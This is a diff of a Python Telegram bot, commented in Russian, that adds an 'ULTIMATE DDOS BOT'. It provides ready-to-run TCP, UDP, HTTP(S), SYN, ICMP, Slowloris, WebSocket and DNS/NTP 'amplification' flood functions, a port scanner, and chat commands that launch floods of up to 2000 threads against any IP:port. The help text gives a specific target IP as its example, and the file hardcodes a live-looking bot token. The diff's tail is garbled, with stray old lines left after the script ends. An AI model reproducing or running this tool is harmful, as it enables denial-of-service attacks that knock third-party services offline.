@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 """
-HYPER DDOS PROXY EDITION - FIXED
-Работает без ошибок!
+╔══════════════════════════════════════════════════════════════════════╗
+║         ULTIMATE DDOS BOT - ALL ATTACK TYPES                         ║
+║                                                                      ║
+║     10+ ВИДОВ АТАК В ОДНОМ БОТЕ                                      ║
+║     TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris | WS | NTP    ║
+╚══════════════════════════════════════════════════════════════════════╝
 """
 
 import telebot
@@ -10,31 +14,389 @@ import threading
 import random
 import time
 import re
+import struct
+import hashlib
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ============ ТОКЕН ============
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ============ КОНФИГ ============
-MAX_THREADS = 2000
-PACKET_DELAY = 0.0001
-MAX_PROXIES = 20000
-
-# Хранилища
+# ============ НАСТРОЙКИ ============
 active_attacks = {}
-proxies_list = []
-valid_proxies = []
-proxy_lock = threading.Lock()
 
-# ============ ПАРСИНГ IP (ГЛАВНАЯ ФУНКЦИЯ) ============
+# Список открытых DNS для амплификации
+DNS_SERVERS = [
+    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
+    "208.67.222.222", "208.67.220.220", "77.88.8.8", "77.88.8.1"
+]
+
+# ============ ВСЕ ВИДЫ АТАК ============
+
+class AttackTypes:
+    
+    # 1. TCP FLOOD
+    @staticmethod
+    def tcp_flood(ip, port, stop_flag):
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((ip, port))
+                sock.send(random._urandom(1024))
+                sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 2. UDP FLOOD
+    @staticmethod
+    def udp_flood(ip, port, stop_flag):
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(random._urandom(1400), (ip, port))
+                sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 3. HTTP FLOOD
+    @staticmethod
+    def http_flood(ip, port, stop_flag):
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+            "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
+        ]
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                sock.connect((ip, port))
+                ua = random.choice(user_agents)
+                req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\n\r\n"
+                sock.send(req.encode())
+                sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 4. HTTPS FLOOD
+    @staticmethod
+    def https_flood(ip, port, stop_flag):
+        import ssl
+        while not stop_flag.is_set():
+            try:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                sock.connect((ip, port))
+                ssl_sock = context.wrap_socket(sock, server_hostname=ip)
+                ssl_sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
+                ssl_sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 5. SYN FLOOD (через raw socket нужно root, делаем эмуляцию)
+    @staticmethod
+    def syn_flood(ip, port, stop_flag):
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
+                sock.connect_ex((ip, port))
+                sock.close()
+            except:
+                pass
+            time.sleep(0.00001)
+    
+    # 6. ICMP FLOOD
+    @staticmethod
+    def icmp_flood(ip, port, stop_flag):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        except:
+            # Если нет root, используем UDP
+            AttackTypes.udp_flood(ip, port, stop_flag)
+            return
+        while not stop_flag.is_set():
+            try:
+                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + random._urandom(64)
+                sock.sendto(packet, (ip, 0))
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 7. SLOWLORIS
+    @staticmethod
+    def slowloris(ip, port, stop_flag):
+        sockets = []
+        try:
+            for _ in range(500):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(4)
+                sock.connect((ip, port))
+                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+                sockets.append(sock)
+            
+            while not stop_flag.is_set():
+                for sock in sockets:
+                    try:
+                        sock.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
+                    except:
+                        sockets.remove(sock)
+                time.sleep(10)
+        except:
+            pass
+    
+    # 8. WEB SOCKET ATTACK
+    @staticmethod
+    def websocket_attack(ip, port, stop_flag):
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                sock.connect((ip, port))
+                key = base64.b64encode(os.urandom(16)).decode()
+                handshake = (
+                    f"GET /socket.io/ HTTP/1.1\r\n"
+                    f"Host: {ip}\r\n"
+                    f"Upgrade: websocket\r\n"
+                    f"Connection: Upgrade\r\n"
+                    f"Sec-WebSocket-Key: {key}\r\n"
+                    f"Sec-WebSocket-Version: 13\r\n\r\n"
+                )
+                sock.send(handshake.encode())
+                sock.close()
+            except:
+                pass
+            time.sleep(0.001)
+    
+    # 9. NTP AMPLIFICATION
+    @staticmethod
+    def ntp_amplification(target_ip, stop_flag):
+        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                ntp_server = random.choice(DNS_SERVERS)
+                sock.sendto(ntp_query, (ntp_server, 123))
+                sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 10. DNS AMPLIFICATION
+    @staticmethod
+    def dns_amplification(target_ip, stop_flag):
+        dns_query = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
+        while not stop_flag.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                dns_server = random.choice(DNS_SERVERS)
+                sock.sendto(dns_query, (dns_server, 53))
+                sock.close()
+            except:
+                pass
+            time.sleep(0.0001)
+    
+    # 11. MULTI-PAYLOAD (все сразу)
+    @staticmethod
+    def multi_payload(ip, port, stop_flag):
+        attacks = [
+            AttackTypes.tcp_flood,
+            AttackTypes.udp_flood,
+            AttackTypes.http_flood,
+            AttackTypes.syn_flood
+        ]
+        idx = 0
+        while not stop_flag.is_set():
+            try:
+                attacks[idx % len(attacks)](ip, port, stop_flag)
+                idx += 1
+            except:
+                pass
+
+# ============ МЕНЕДЖЕР АТАК ============
+class AttackManager:
+    def __init__(self, ip, port, attack_type, threads):
+        self.ip = ip
+        self.port = port
+        self.attack_type = attack_type
+        self.threads = threads
+        self.stop_flag = threading.Event()
+        self.thread_list = []
+        self.start_time = None
+        self.active = False
+    
+    def start(self):
+        self.active = True
+        self.start_time = time.time()
+        
+        attack_func = {
+            'tcp': AttackTypes.tcp_flood,
+            'udp': AttackTypes.udp_flood,
+            'http': AttackTypes.http_flood,
+            'https': AttackTypes.https_flood,
+            'syn': AttackTypes.syn_flood,
+            'icmp': AttackTypes.icmp_flood,
+            'slow': AttackTypes.slowloris,
+            'ws': AttackTypes.websocket_attack,
+            'ntp': AttackTypes.ntp_amplification,
+            'dns': AttackTypes.dns_amplification,
+            'multi': AttackTypes.multi_payload
+        }.get(self.attack_type, AttackTypes.tcp_flood)
+        
+        for i in range(self.threads):
+            t = threading.Thread(target=attack_func, args=(self.ip, self.port, self.stop_flag))
+            t.daemon = True
+            self.thread_list.append(t)
+            t.start()
+    
+    def stop(self):
+        self.stop_flag.set()
+        self.active = False
+    
+    def duration(self):
+        if self.start_time:
+            return int(time.time() - self.start_time)
+        return 0
+
+# ============ ПАРСИНГ ============
 def parse_target(text):
-    """Извлекает IP и порт из текста"""
-    # Шаблон для IP:PORT
     match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
     if match:
         return match.group(1), int(match.group(2))
+    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
+    if match:
+        return match.group(1), None
+    return None, None
+
+def scan_port(ip):
+    ports = [15455, 9339, 443, 80, 8080, 8443, 3000, 5000]
+    for port in ports:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            sock.connect((ip, port))
+            sock.close()
+            return port
+        except:
+            continue
+    return 80
+
+# ============ БОТ ============
+@bot.message_handler(commands=['start'])
+def start_cmd(message):
+    bot.send_message(message.chat.id,
+        "🔥 *ULTIMATE DDOS BOT* 🔥\n\n"
+        "*Типы атак:*\n"
+        "`tcp` - TCP Flood\n"
+        "`udp` - UDP Flood\n"
+        "`http` - HTTP Flood\n"
+        "`https` - HTTPS Flood\n"
+        "`syn` - SYN Flood\n"
+        "`icmp` - ICMP Flood\n"
+        "`slow` - Slowloris\n"
+        "`ws` - WebSocket\n"
+        "`ntp` - NTP Amplification\n"
+        "`dns` - DNS Amplification\n"
+        "`multi` - ВСЕ СРАЗУ\n\n"
+        "*Команды:*\n"
+        "`/attack IP:PORT тип потоки`\n"
+        "`/stop` - остановить\n"
+        "`/status` - статус\n\n"
+        "Пример: `/attack 43.158.103.205:15455 multi 500`",
+        parse_mode="Markdown")
+
+@bot.message_handler(commands=['attack'])
+def attack_cmd(message):
+    cid = message.chat.id
+    args = message.text.split()
+    
+    if len(args) < 4:
+        bot.reply_to(message, "❌ /attack IP:PORT тип потоки\nПример: /attack 1.2.3.4:80 tcp 500")
+        return
+    
+    target = args[1]
+    attack_type = args[2].lower()
+    threads = int(args[3]) if args[3].isdigit() else 300
+    
+    ip, port = parse_target(target)
+    if not ip:
+        bot.reply_to(message, "❌ Неверный IP")
+        return
+    
+    if not port:
+        port = scan_port(ip)
+    
+    if cid in active_attacks and active_attacks[cid].active:
+        bot.reply_to(message, "⚠️ Атака уже идёт! /stop")
+        return
+    
+    threads = min(threads, 2000)
+    
+    attack = AttackManager(ip, port, attack_type, threads)
+    attack.start()
+    active_attacks[cid] = attack
+    
+    bot.reply_to(message,
+        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
+        f"📍 {ip}:{port}\n"
+        f"⚡ Тип: {attack_type.upper()}\n"
+        f"🧵 Потоков: {threads}\n"
+        f"🛑 /stop для остановки",
+        parse_mode="Markdown")
+
+@bot.message_handler(commands=['stop'])
+def stop_cmd(message):
+    cid = message.chat.id
+    if cid in active_attacks and active_attacks[cid].active:
+        active_attacks[cid].stop()
+        dur = active_attacks[cid].duration()
+        bot.reply_to(message, f"🛑 Атака остановлена. Длилась {dur} сек")
+        del active_attacks[cid]
+    else:
+        bot.reply_to(message, "💤 Нет активной атаки")
+
+@bot.message_handler(commands=['status'])
+def status_cmd(message):
+    cid = message.chat.id
+    if cid in active_attacks and active_attacks[cid].active:
+        a = active_attacks[cid]
+        bot.reply_to(message,
+            f"📊 *СТАТУС*\n\n"
+            f"🎯 {a.ip}:{a.port}\n"
+            f"⚡ Тип: {a.attack_type.upper()}\n"
+            f"⏱️ Время: {a.duration()} сек\n"
+            f"🧵 Потоков: {a.threads}\n"
+            f"🔄 Активно: {len([t for t in a.thread_list if t.is_alive()])}",
+            parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "💤 Нет активной атаки")
+
+@bot.message_handler(func=lambda m: True)
+def unknown(m):
+    bot.reply_to(m, "Используй команды:\n/attack IP:PORT тип потоки\n/stop\n/status")
+
+# ============ ЗАПУСК ============
+if __name__ == "__main__":
+    import os, base64
+    print("""
+    ╔════════════════════════════════════════════════════════════════╗
+    ║     ULTIMATE DDOS BOT - ALL ATTACK TYPES                       ║
+    ║                                                                 ║
+    ║     TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris          ║
+    ║     WebSocket | NTP | DNS | MULTI                              ║
+    ║                                                                 ║
+    ║     Бот запущен!                                               ║
+    ╚════════════════════════════════════════════════════════════════╝
+    """)
+    bot.infinity_polling()        return match.group(1), int(match.group(2))
     
     # Шаблон для просто IP
     match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
